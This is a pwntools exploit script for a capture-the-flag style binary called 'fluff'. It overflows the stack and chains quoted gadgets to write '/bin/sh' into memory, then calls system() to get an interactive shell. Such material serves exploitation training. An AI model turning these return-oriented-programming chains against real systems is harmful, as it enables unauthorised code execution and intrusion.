#/usr/bin/env python

from pwn import *

context.binary = './fluff'
#context.log_level = 'debug'

io = process('./fluff')
elf = ELF('./fluff')
'''
.text:0000000000400820
.text:0000000000400820               pop     r15
.text:0000000000400822               xor     r11, r11
.text:0000000000400825               pop     r14
.text:0000000000400827               mov     edi, offset __data_start
.text:000000000040082C               retn
.text:000000000040082D -------------------------------------------------------------------------
.text:000000000040082D               pop     r14
.text:000000000040082F               xor     r11, r12
.text:0000000000400832               pop     r12
.text:0000000000400834               mov     r13d, 604060h
.text:000000000040083A               retn
.text:000000000040083B -------------------------------------------------------------------------
.text:000000000040083B               mov     edi, offset __data_start
.text:0000000000400840               xchg    r10, r11
.text:0000000000400843               pop     r15
.text:0000000000400845               mov     r11d, 602050h
.text:000000000040084B               retn
.text:000000000040084C -------------------------------------------------------------------------
.text:000000000040084C               pop     r15
.text:000000000040084E               mov     [r10], r11
.text:0000000000400851               pop     r13
.text:0000000000400853               pop     r12
.text:0000000000400855               xor     [r10], r12b
.text:0000000000400858               retn
.text:0000000000400858 ; ---------------------------------------------------------------------------
'''

command = "/bin/sh\x00"
# for i in command:
# 	print hex(ord(i))

io.recv()
payload1 = 'A'*(0x28)
payload1 += p64(0x400820) #xor r11,r11;
payload1 += p64(0)+p64(0)
payload1 += p64(0x4008bc) #pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
payload1 += p64(0x601088)
payload1 += p64(0)+p64(0)+p64(0)
payload1 += p64(0x40082D) #xor r11,r12
payload1 += p64(0)+p64(0)
payload1 += p64(0x40083B) #xchg r11,r12;ret
payload1 += p64(0)
payload1 += p64(0x400820) #xor r11,r11;ret
payload1 += p64(0)+p64(0)
payload1 += p64(0x4008bc) # pop r12 
payload1 += p64(0x68732f6e69622f) # '/bin/sh'
payload1 += p64(0)+p64(0)+p64(0)
payload1 += p64(0x40082D) #xor r11,r12;ret
payload1 += p64(0)+p64(0)
payload1 += p64(0x40084C) #mov [r10], r11;ret
payload1 += p64(0)+p64(0)+p64(0)
payload1 += p64(elf.symbols['pwnme'])
gdb.attach(io)
io.sendline(payload1)

io.recv()
payload2 = 'A'*(0x28)
payload2 += p64(0x4008c3)
payload2 += p64(0x601088)
payload2 += p64(elf.plt['system'])

io.sendline(payload2)

io.interactive()